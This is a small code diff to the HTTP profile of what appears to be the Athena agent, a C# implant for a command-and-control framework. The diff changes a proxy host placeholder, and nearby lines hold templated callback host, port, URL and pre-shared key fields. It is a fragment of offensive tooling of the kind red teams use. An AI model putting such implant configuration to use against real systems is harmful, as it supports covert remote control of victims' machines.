@@ -49,7 +49,7 @@ namespace Athena.Profiles.HTTP
             this.hostHeader = "%HOSTHEADER%";
             this.getURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{getUri}?{queryPath}=";
             this.postURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{postUri}";
-            this.proxyHost = ":";
+            this.proxyHost = "proxy_host:proxy_port";
             this.proxyPass = "proxy_pass";
             this.proxyUser = "proxy_user";
             this.psk = "AESPSK";
